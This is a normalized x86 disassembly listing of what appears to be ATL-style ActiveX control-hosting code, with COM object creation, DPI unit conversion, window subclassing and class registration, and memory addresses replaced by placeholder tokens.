push ebx
push 0x1
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x48 ] ebx
call [ CoGetClassObject@IAT ]
mov ebp eax
cmp ebp ebx
jl r-xdata
mov [ esp + 0x34 ] 0xffffffff
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push edi
push esi
push r--data
push ebx
push ebx
push eax
mov eax [ edx + 0x1c ]
call eax
mov ebp eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax ebp
jmp r-xdata
sub_414f00
push ecx
test ebx ebx
jne r-xdata
test edi edi
jne r-xdata
push 0x80004003
call sub_427e00
push ebp
push esi
push 0x0
call [ GetDC@IAT ]
mov ebp [ GetDeviceCaps@IAT ]
mov esi eax
push 0x58
push esi
call ebp
push 0x5a
push esi
mov [ esp + 0x10 ] eax
call ebp
push esi
push 0x0
mov ebp eax
call [ ReleaseDC@IAT ]
mov eax [ esp + 0x8 ]
mov ecx [ ebx ]
mov esi [ MulDiv@IAT ]
push eax
push ecx
push 0x9ec
call esi
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
push ebp
push edx
push 0x9ec
call esi
pop esi
mov [ edi + 0x4 ] eax
pop ebp
pop ecx
retn
push 0x80004003
call sub_427e00
sub_414f80
push ecx
test ebx ebx
jne r-xdata
test edi edi
jne r-xdata
push 0x80004003
call sub_427e00
push ebp
push esi
push 0x0
call [ GetDC@IAT ]
mov ebp [ GetDeviceCaps@IAT ]
mov esi eax
push 0x58
push esi
call ebp
push 0x5a
push esi
mov [ esp + 0x10 ] eax
call ebp
push esi
push 0x0
mov ebp eax
call [ ReleaseDC@IAT ]
mov eax [ ebx ]
mov ecx [ esp + 0x8 ]
mov esi [ MulDiv@IAT ]
push 0x9ec
push eax
push ecx
call esi
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
push 0x9ec
push edx
push ebp
call esi
pop esi
mov [ edi + 0x4 ] eax
pop ebp
pop ecx
retn
push 0x80004003
call sub_427e00
sub_415000
push 0xffffffff
push sub_459488
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push ebp
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x2c ]
test edi edi
jne r-xdata
cmp [ esi + 0x60 ] edi
je r-xdata
xor eax eax
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebp
pop ebx
add esp 0x18
retn 0xc
mov ecx [ edi ]
mov edx [ ecx ]
lea ebp [ esi + 0x64 ]
push ebp
push r--data
push edi
xor ebx ebx
call edx
mov eax [ ebp ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push edi
call ecx
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x28 ] 0x6
mov eax [ edi ]
mov edx [ eax ]
push r--data
push edi
call edx
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x58 ]
lea edi [ esi + 0xa0 ]
push edi
push 0x1
push eax
call edx
test [ edi ] 0x20000
je r-xdata
mov [ esi + 0x60 ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ esp + 0x24 ] 0xffffffff
test eax eax
je r-xdata
mov edi [ eax ]
mov ebp eax
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
add edi 0xc
call edx
push eax
mov eax [ edi ]
push ebp
call eax
mov eax [ esp + 0x18 ]
cmp [ esp + 0x30 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
xor edi edi
mov [ esp + 0x14 ] edi
cmp eax edi
je r-xdata
mov eax ebx
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebp
pop ebx
add esp 0x18
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ esi + 0xa0 ] 0x20000
jne r-xdata
mov eax [ ebp ]
xor ecx ecx
mov [ esp + 0x30 ] ecx
test eax eax
je r-xdata
mov [ esp + 0x24 ] edi
mov eax [ ebp ]
mov edx [ esp + 0x14 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ esp + 0x24 ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ ebp ]
lea edi [ esi + 0x70 ]
push edi
mov [ esi + 0x90 ] 0x0
mov ecx [ eax ]
mov edx [ ecx ]
push r--data
push eax
call edx
mov ebx eax
test ebx ebx
jge r-xdata
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
mov [ esp + 0x30 ] 0x0
test eax eax
je r-xdata
mov [ esp + 0x24 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ eax ]
lea edx [ esp + 0x30 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ esp + 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x90 ] 0x7
jmp r-xdata
mov eax [ ebp ]
mov ecx [ eax ]
mov edx [ ecx ]
push edi
push r--data
push eax
call edx
mov ebx eax
test ebx ebx
jl r-xdata
mov [ esp + 0x24 ] 0x3
mov eax [ ebp ]
mov edx [ esp + 0x30 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ esp + 0x24 ] 0xffffffff
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ esp + 0x30 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi [ esp + 0x34 ]
test edi edi
je r-xdata
mov eax [ esp + 0x34 ]
mov edx [ ecx ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
mov eax [ ebp ]
mov ecx [ eax ]
mov edx [ ecx ]
push edi
push r--data
push eax
call edx
mov ebx eax
test ebx ebx
jl r-xdata
mov [ esi + 0x90 ] 0x3
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x24 ] 0xffffffff
test ecx ecx
je r-xdata
mov edx [ ebp ]
xor eax eax
mov [ esp + 0x34 ] eax
test edx edx
je r-xdata
mov eax [ edx + 0x20 ]
push ecx
call eax
mov ebx eax
jmp r-xdata
push eax
mov eax [ edx + 0x14 ]
push ecx
call eax
mov ebx eax
jmp r-xdata
mov [ esp + 0x24 ] 0x4
mov eax [ ebp ]
mov ecx [ eax ]
lea edx [ esi + 0x9c ]
push edx
push [ esp + 0x14 ]
push eax
mov eax [ ecx + 0x4c ]
call eax
mov edi [ edi ]
test edi edi
je r-xdata
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov [ esi + 0x90 ] 0x1
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ecx
call eax
mov [ esp + 0x24 ] 0x2
test eax eax
je r-xdata
mov ecx [ edx ]
mov ecx [ ecx ]
lea eax [ esp + 0x34 ]
push eax
push r--data
push edx
call ecx
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
mov eax [ ebp ]
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0x0
push r--data
push eax
call edx
test [ esi + 0xa0 ] 0x400
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ edi ]
mov eax [ ecx + 0x1c ]
push edx
push 0x0
push 0x1
push edi
call eax
mov [ esp + 0x24 ] 0x1
test eax eax
je r-xdata
mov edx [ eax ]
push edi
push eax
mov eax [ edx + 0x14 ]
call eax
mov ecx [ esp + 0x30 ]
mov ebx eax
mov eax [ esp + 0x34 ]
test [ esi + 0xa0 ] 0x20000
je r-xdata
mov [ esp + 0x24 ] 0xffffffff
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea edi [ esi + 0xb4 ]
push edi
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0xbc ]
mov edx [ esi + 0xc0 ]
sub ecx [ edi ]
sub edx [ esi + 0xb8 ]
lea ebx [ esi + 0xac ]
lea edi [ esi + 0xa4 ]
mov [ ebx ] ecx
mov [ esi + 0xb0 ] edx
call sub_414f00
mov eax [ ebp ]
mov ecx [ eax ]
mov edx [ ecx + 0x44 ]
lea ebx [ esi + 0xa4 ]
push ebx
push 0x1
push eax
call edx
mov eax [ ebp ]
mov ecx [ eax ]
mov edx [ ecx + 0x48 ]
push ebx
push 0x1
push eax
call edx
lea edi [ esi + 0xac ]
call sub_414f80
mov eax [ esi + 0xb4 ]
mov ecx [ esi + 0xb0 ]
add eax [ esi + 0xac ]
add ecx [ esi + 0xb8 ]
mov edx [ esi ]
lea edi [ esi + 0xb4 ]
mov [ esi + 0xbc ] eax
mov eax [ edx + 0x10 ]
mov [ esi + 0xc0 ] ecx
mov ecx esi
call eax
mov [ esp + 0x34 ] 0x0
test eax eax
je r-xdata
xor edi edi
cmp ebx edi
jge r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0xa0 ] edi
mov eax [ ebp ]
cmp eax edi
je r-xdata
mov eax [ ebp ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push edi
push eax
call edx
mov ecx [ esp + 0x30 ]
mov edi [ esp + 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x24 ] 0x5
mov edx [ esi + 0x4 ]
mov eax [ esp + 0x34 ]
mov ebp [ ebp ]
mov ecx [ ebp ]
mov ecx [ ecx + 0x2c ]
push edi
push edx
push 0x0
push eax
push 0x0
push 0xfffffffb
push ebp
call ecx
mov edx [ esi + 0x4 ]
push 0x507
push 0x0
push 0x0
push edx
mov ebx eax
call [ RedrawWindow@IAT ]
mov [ esp + 0x24 ] 0x4
mov eax [ esp + 0x34 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ esp + 0x34 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ esi + 0x60 ]
cmp eax edi
je r-xdata
mov [ ebp ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ esp + 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x24 ] 0xffffffff
cmp ecx edi
je r-xdata
mov [ esi + 0x60 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
jmp r-xdata
sub_415510
sub esp 0x8
test eax eax
jne r-xdata
mov ecx [ eax ]
push esi
lea edx [ esp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] 0x0
call eax
mov esi eax
test esi esi
jl r-xdata
mov eax 0x80070057
add esp 0x8
retn 0xc
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
lea edx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x18 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov esi eax
test esi esi
jl r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0x14 ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
mov esi eax
mov eax esi
pop esi
add esp 0x8
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4155b0
xor eax eax
push esi
mov [ esi ] ax
call [ VariantClear@IAT ]
mov ecx 0x8
push edi
mov [ esi ] cx
call [ SysAllocString@IAT ]
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
mov eax esi
retn
test edi edi
je r-xdata
mov edx 0xa
push 0x8007000e
mov [ esi ] dx
mov [ esi + 0x8 ] 0x8007000e
call sub_427e00
sub_415600
test [ esi + 0xc8 ] 0x10
je r-xdata
mov edx [ esi + 0x4 ]
push edx
call [ DestroyWindow@IAT ]
mov eax [ esi + 0x4 ]
push 0xfffffffc
push eax
call [ GetWindowLongW@IAT ]
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x4 ]
push eax
push 0xfffffffc
push ecx
call [ SetWindowLongW@IAT ]
test eax eax
je r-xdata
retn
mov eax [ esi + 0x4 ]
mov ecx [ DefWindowProcW@IAT ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x4 ] 0x0
test eax eax
je r-xdata
and [ esi + 0xc8 ] 0xffffffef
retn
sub_415660
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x18 ]
sub esp 0x3c
push ebx
push esi
push edi
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ edi - 0x24 ]
mov [ eax ] 0x0
mov ebx 0x1
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x24 ] esi
call sub_419140
lea eax [ edi - 0x20 ]
mov [ esp + 0x14 ] eax
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0x80004003
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0x10 ]
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ ebp + 0x10 ]
mov ecx [ esp + 0x14 ]
cmp [ ecx ] ebx
je r-xdata
push 0x507
push 0x0
push 0x0
push eax
call [ RedrawWindow@IAT ]
call sub_415600
cmp [ edi + 0xa8 ] 0x0
jne r-xdata
call sub_414bd0
shl eax 0x4
xor eax [ esi + 0xc8 ]
mov [ esp + 0x13 ] 0x1
and eax 0x10
xor [ esi + 0xc8 ] eax
mov eax [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
push eax
lea edx [ esp + 0x16 ]
mov ecx esi
mov [ esp + 0x16 ] 0x0
call sub_414d00
mov ebx eax
add esp 0x4
test ebx ebx
jl r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_414c40
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ eax ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + 0x5c ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
test ebx ebx
jl r-xdata
mov ecx [ ebp + 0x14 ]
mov esi [ esp + 0x24 ]
push ecx
mov edx edi
mov eax [ edx ]
push 0x0
push eax
call sub_415000
mov esi [ ebp + 0xc ]
mov ebx eax
push 0x5
push 0xf
jmp r-xdata
mov esi [ esp + 0x24 ]
call sub_419140
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx ]
test eax eax
je r-xdata
call [ GetSysColor@IAT ]
mov [ edi + 0xa8 ] eax
push 0x507
push 0x0
push 0x0
push eax
call [ RedrawWindow@IAT ]
test ebx ebx
jge r-xdata
cmp [ esp + 0x12 ] 0x0
je r-xdata
mov edx [ ebp + 0x20 ]
test edx edx
je r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
je r-xdata
add edi 0x70
push edi
push ecx
push edx
call sub_415510
call sub_415600
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x0
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
mov edi [ GetWindowLongW@IAT ]
push 0xfffffff0
push edx
call edi
test eax 0x300000
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push 0xfffffff0
push ecx
call edi
mov edi [ esp + 0x14 ]
mov edx [ edi ]
and eax 0xffcfffff
push eax
push 0xfffffff0
push edx
call [ SetWindowLongW@IAT ]
mov eax [ edi ]
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov eax [ ebp + 0x8 ]
or [ eax + 0xbc ] 0x8
jmp r-xdata
movzx eax [ esi ]
cmp ax 0x4d
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
push edi
call eax
mov ecx [ ebp + 0x18 ]
mov edi [ ecx ]
mov [ esp + 0x1c ] edi
test edi edi
je r-xdata
movzx eax [ esi + 0x2 ]
cmp ax 0x53
je r-xdata
cmp ax 0x6d
jne r-xdata
movzx eax [ esi + 0x4 ]
cmp ax 0x48
je r-xdata
cmp ax 0x73
jne r-xdata
mov eax [ edi ]
mov edx [ eax ]
lea ecx [ esp + 0x18 ]
push ecx
push r--data
push edi
mov [ esp + 0x24 ] 0x0
call edx
cmp [ esp + 0x18 ] 0x0
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax 0x54
je r-xdata
cmp ax 0x68
jne r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x28 ]
push eax
call [ VariantInit@IAT ]
mov edi esi
lea esi [ esp + 0x38 ]
call sub_4155b0
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0xa4 ]
push 0xffffffff
push eax
call edx
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x28 ]
push edx
push edx
push edx
push edx
mov edx esi
push edx
push eax
mov eax [ ecx + 0xd0 ]
call eax
mov ecx esi
mov esi [ VariantClear@IAT ]
push ecx
call esi
lea edx [ esp + 0x28 ]
push edx
call esi
mov eax [ esp + 0x18 ]
movzx eax [ esi + 0x8 ]
cmp ax 0x4d
je r-xdata
cmp ax 0x74
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
mov edi [ esp + 0x1c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
movzx eax [ esi + 0xa ]
cmp ax 0x4c
je r-xdata
cmp ax 0x6d
jne r-xdata
cmp [ esi + 0xc ] 0x3a
jne r-xdata
cmp ax 0x6c
jne r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax - 0xe ]
push edi
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ebx 0x8007000e
jmp r-xdata
push esi
mov [ esp + 0x24 ] 0x0
call [ GlobalLock@IAT ]
mov ecx [ ebp + 0xc ]
push eax
add ecx 0xe
mov eax edi
mov edx edi
call sub_41a8e0
add esp 0x4
push esi
call [ GlobalUnlock@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x1
push esi
call [ CreateStreamOnHGlobal@IAT ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ esp + 0x20 ]
jmp r-xdata
mov eax [ esp + 0x1c ]
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ esp + 0x18 ]
push ecx
push r--data
push eax
mov [ esp + 0x24 ] 0x0
call edx
mov ebx eax
test ebx ebx
jl r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
mov ebx eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_415a70
push esi
mov esi [ esp + 0xc ]
mov eax 0x80004003
test esi esi
je r-xdata
pop esi
retn 0x8
push edi
mov edi [ esp + 0xc ]
mov [ esi ] 0x0
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov ecx [ edi - 0x4 ]
mov edx [ ecx ]
lea eax [ edi - 0x4 ]
push esi
push r--data
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx ]
push esi
push r--data
push eax
call edx
test eax eax
jge r-xdata
pop edi
sub_415ac0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi - 0x24 ]
push edi
push eax
call [ GetDC@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
pop edi
mov eax 0x80004005
pop esi
retn 0x4
mov ecx [ esi - 0x24 ]
push edi
push ecx
call [ ReleaseDC@IAT ]
pop edi
xor eax eax
pop esi
retn 0x4
mov edx [ eax ]
push 0x0
push 0x0
lea ecx [ esi + 0x8c ]
push ecx
push ecx
push edi
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x1
push eax
mov eax [ edx + 0xc ]
call eax
sub_415b90
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x38 ]
or [ esi + 0x6c ] 0x1
push 0x0
push 0x1
push eax
call [ OleLockRunning@IAT ]
mov eax [ esi + 0x38 ]
and [ esi + 0x6c ] 0xfffffff7
mov ecx [ eax ]
mov edx [ ecx ]
add esi 0x48
push esi
push r--data
push eax
call edx
xor eax eax
pop esi
retn 0x4
sub_415be0
mov ecx [ DefWindowProcW@IAT ]
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] al
mov [ esi + 0x4 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] ecx
mov ecx [ rw-data ]
mov [ esi + 0x48 ] eax
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax esi
retn
sub_415c30
push esi
mov esi ecx
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov [ esi + 0x28 ] 0xc0000001
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x48 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push esi
call sub_416500
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call [ DestroyWindow@IAT ]
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_415cc0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
push ebx
push eax
lea ecx [ esi + 0x20 ]
push ecx
mov ebx rw-data
call sub_415fe0
mov edx [ esp + 0x14 ]
add esp 0x8
push edx
push 0x0
push 0xcf0000
movzx ebx ax
mov eax [ esp + 0x14 ]
push r--data
push eax
mov eax esi
call sub_416350
pop ebx
retn 0x8
mov [ rw-data ] 0x0
sub_415d10
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
test ebx ebx
jne r-xdata
mov edi [ esp + 0x10 ]
cmp [ edi - 0x20 ] 0x0
jne r-xdata
mov eax 0x80004003
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ edi - 0x20 ]
pop edi
mov [ ebx ] eax
pop esi
xor eax eax
pop ebx
retn 0x8
push ecx
mov eax esp
mov [ eax ] 0x0
push ecx
mov eax esp
lea esi [ edi - 0x24 ]
mov [ eax ] 0x0
call sub_415cc0
sub_415da0
push ebp
mov ebp esp
push 0xffffffff
push sub_459c00
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov edi 0x8007000e
push 0x4c
mov [ eax ] ebx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_43fa1d
add esp 0x4
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
mov esi eax
call sub_415be0
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0x2c ]
mov ecx edi
call sub_41a300
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
cmp eax ebx
mov edi eax
jl r-xdata
mov [ edi + 0x18 ] 0x1
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x1
mov ecx esi
call edx
xor esi esi
jmp r-xdata
xor edi edi
jmp r-xdata
sub_415ea0
mov ecx [ DefWindowProcW@IAT ]
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] al
mov [ esi + 0x4 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] ecx
mov ecx [ rw-data ]
mov [ esi + 0x48 ] eax
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax esi
retn
sub_415f00
push esi
mov esi ecx
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov [ esi + 0x28 ] 0xc0000001
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x48 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push esi
call sub_416500
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call [ DestroyWindow@IAT ]
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_415f70
push esi
push edi
mov edi [ esp + 0xc ]
lea eax [ edi + 0x4 ]
push eax
call [ InterlockedDecrement@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
retn 0x4
lea ecx [ edi - 0x24 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push 0x1
call eax
mov eax esi
sub_415fa0
push ecx
test eax eax
je r-xdata
xor eax eax
pop ecx
retn
push ebx
push esi
push eax
call [ RegisterClassExW@IAT ]
movzx eax ax
lea ebx [ esp + 0x8 ]
mov esi rw-data
mov [ esp + 0x8 ] eax
call sub_419810
movzx eax [ esp + 0x8 ]
pop esi
pop ebx
pop ecx
retn
sub_415fe0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x70
push esi
push edi
test ebx ebx
je r-xdata
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
push rw-data
mov [ esp + 0x14 ] rw-data
call [ EnterCriticalSection@IAT ]
cmp [ ebx + 0x40 ] 0x0
mov [ esp + 0x14 ] 0x1
jne r-xdata
mov ax [ ebx + 0x40 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
lea ecx [ esp + 0x10 ]
call sub_419cd0
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x3c ]
mov ecx [ ebx + 0x38 ]
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
push ecx
push eax
call [ LoadCursorW@IAT ]
mov [ ebx + 0x1c ] eax
mov ecx [ ebx + 0x28 ]
mov edx [ ebx + 0x8 ]
mov esi [ GetClassInfoExW@IAT ]
mov [ esp + 0x8 ] ecx
lea ecx [ esp + 0x18 ]
push ecx
push eax
push 0x0
mov [ esp + 0x18 ] edx
mov [ esp + 0x24 ] 0x30
call esi
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
lea edx [ esp + 0x48 ]
push edx
mov ecx 0xc
mov esi ebx
lea edi [ esp + 0x4c ]
[ edi ] [ esi ]
mov ecx [ ebx + 0x14 ]
push eax
push ecx
call [ GetClassInfoExW@IAT ]
mov [ ebx + 0x40 ] ax
test ax ax
jne r-xdata
push ebx
push r--data
lea esi [ ebx + 0x42 ]
push 0x25
push esi
call sub_44063c
add esp 0x10
mov [ ebx + 0x28 ] esi
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
mov ecx 0xc
lea esi [ esp + 0x18 ]
mov edi ebx
[ edi ] [ esi ]
mov ecx [ ebx + 0x8 ]
mov [ ebx + 0x34 ] ecx
